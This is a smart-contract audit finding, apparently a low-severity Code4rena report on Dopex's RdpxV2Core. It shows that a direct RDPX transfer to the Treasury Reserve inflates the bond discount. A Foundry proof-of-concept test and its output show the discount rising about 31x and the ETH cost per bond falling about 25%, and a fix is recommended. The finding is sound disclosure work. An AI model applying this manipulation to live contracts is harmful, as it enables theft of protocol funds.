## [01] bondDiscount can be manipulated via direct transfer to Treasury Reserve

[`bondDiscount`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/core/RdpxV2Core.sol#L1163) incorporates the Treasury Reserves () in it's calculation. The higher the reserves the higher the discount applied to a bond. There is potential for RDPX to lose significant value (hack or manipulation somewhere in the Dopex ecosystem), a direct transfer of RDPX made to the treasury reserve to increase the discount and reduce the ETH required to mint a bond that can then be redeemed for DPX/ETH which is 1:1 to ETH. There's no information on the RDPX price oracle and it is out of scope however if RDPX were to lose value and the Oracle was not timely in updating the price then there's potential for discount manipulation.

Admittedly a number of things need to go wrong (hence raising as a low instead of medium) however oracle manipulation is a common attack vector and once manipulated attackers will look to use a manipulated asset (RDPX) to redeem one that is greater value (ETH). Bonds that were minted at a higher discount would still need to wait for maturity before being redeemed. Dopex would be able to pause the contracts, stop redemption however this would cause significant disruption to their protocol.

Paste the following test in any .t.sol file that inherits Setup.

```
  function testReservesManipulation() public {
    //rdpxPriceOracle.updateRdpxPrice(1000000);
    vm.label(address(weth), "WETH");
    vm.label(address(rdpx), "RDPX");
    vm.label(address(rdpxReserveContract), "RDPX Reserve");

    vm.startPrank(address(1337));
    rdpx.approve(address(rdpxV2Core), type(uint256).max);
    weth.approve(address(rdpxV2Core), type(uint256).max);
    vm.stopPrank();

    console.log("Reserve balance: ", rdpx.balanceOf(address(rdpxReserveContract)));
    (uint256 rdpxIn, uint256 wethIn) = rdpxV2Core.calculateBondCost(1 ether, 0);
    console2.log("RDPX before reserve manipulation", rdpxIn);
    console2.log("WETH before reserve manipulation", wethIn);
    rdpx.mint(address(1337), rdpxIn);
    weth.mint(address(1337), wethIn);
    vm.prank(address(1337));
    uint256 rt_first = rdpxV2Core.bond(1 ether, 0, address(1337));
    console2.log("Receipt Token", rt_first);

    rdpx.mint(address(this), 100_000 ether);
    rdpx.transfer(address(rdpxReserveContract), 100_000 ether);

    console.log("Reserve balance: ", rdpx.balanceOf(address(rdpxReserveContract)));
    (uint256 rdpxInManip, uint256 wethInManip) = rdpxV2Core.calculateBondCost(1 ether, 0);
    console2.log("RDPX after reserve manipulation", rdpxInManip);
    console2.log("WETH after reserve manipulation", wethInManip);
    rdpx.mint(address(1337), rdpxInManip);
    weth.mint(address(1337), wethInManip);
    vm.prank(address(1337));
    uint256 rt_second =  rdpxV2Core.bond(1 ether, 0, address(1337));
    console2.log("Receipt Token", rt_second);
  }
```

Which outputs;

```
  Reserve balance:  100000000000000000000
  Bond discount 100000000
  RDPX before reserve manipulation 1225000000000000000
  WETH before reserve manipulation 806250000000000000
  Bond discount 100000000
  Receipt Token 250000000000000000
  Reserve balance:  100098725000000000000000
  Bond discount 3163838254
  RDPX after reserve manipulation 459040436500000000
  WETH after reserve manipulation 614760109125000000
  Bond discount 3163838254
  Receipt Token 250000000000000000
```

In the output above the bondDiscount is increased by 31x with the direct transfer of RDPX to the Treasury Reserve ([`RdpxReserve.sol`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/reserve/RdpxReserve.sol)) contract. ETH required to mint a bond reduces by ~25% but the receipt token and the ability to redeem DPX/ETH remains the same.

Note: Bond discount is from a console2.log added to RdpxV2Core.sol after `bondDiscount` e.g. `console2.log("Bond discount", bondDiscount);`

## Recommendation

[`RdpxReserve.sol`](https://github.com/code-423n4/2023-08-dopex/blob/main/contracts/reserve/RdpxReserve.sol) should have a `deposit()` function and a state variable to track the current reserves so that it is not vulnerable to direct deposit attacks.